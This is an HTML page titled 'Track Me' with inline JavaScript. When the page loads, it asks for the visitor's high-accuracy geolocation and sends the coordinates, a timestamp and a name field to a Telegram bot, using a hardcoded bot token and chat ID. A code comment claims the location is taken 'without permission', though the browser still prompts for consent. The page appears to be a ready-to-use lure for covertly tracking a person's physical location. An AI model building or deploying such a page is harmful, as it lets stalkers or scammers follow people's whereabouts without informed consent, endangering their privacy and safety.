<!DOCTYPE html>
<html>
<head>
    <title>Track Me</title>
    <style>
        body {
            background-image: url('img/altarys gif.gif');
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            max-width: 500px;
        }
        #status {
            margin-top: 15px;
            padding: 10px;
            background: rgba(0,0,0,0.5);
            border-radius: 8px;
            font-size: 14px;
            word-break: break-word;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📍 Location Tracker</h1>
        <p>Capturing your location...</p>
        <div id="status">⏳ Loading...</div>
    </div>

    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA'; // <-- REPLACE OR HIDE
        const CHAT_ID = '5410457102';
        const statusDiv = document.getElementById('status');

        // ==================== SEND TO TELEGRAM ====================
        async function sendToTelegram(lat, lon, source, device, userName) {
            const textMsg = `👤 Name: ${userName || 'Anonymous'}\n` +
                            `📍 Location: ${lat}, ${lon} (${source})\n` +
                            `📱 Device: ${device}\n` +
                            `🕒 Time: ${new Date().toLocaleString()}`;

            // 1. Send text
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
            });

            // 2. Send native location pin
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
            });
        }

        // ==================== MAIN ACTION ====================
        async function captureAndSendData() {
            try {
                // Get location without permission
                const location = await getLocation();

                // Send location data
                await sendToTelegram(location.lat, location.lon, 'Geolocation API', 'Unknown', 'Anonymous');
                statusDiv.textContent = '✅ LOCATION SENT! Check your Telegram.';
            } catch (err) {
                statusDiv.textContent = '❌ ERROR: ' + err.message;
                console.error(err);
            }
        }

        // ==================== GET LOCATION ====================
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude
                            });
                        },
                        (error) => {
                            reject(error);
                        },
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    reject(new Error('Geolocation is not supported by this browser.'));
                }
            });
        }

        // Capture and send data when the page loads
        window.onload = captureAndSendData;
    </script>
</body>
</html>
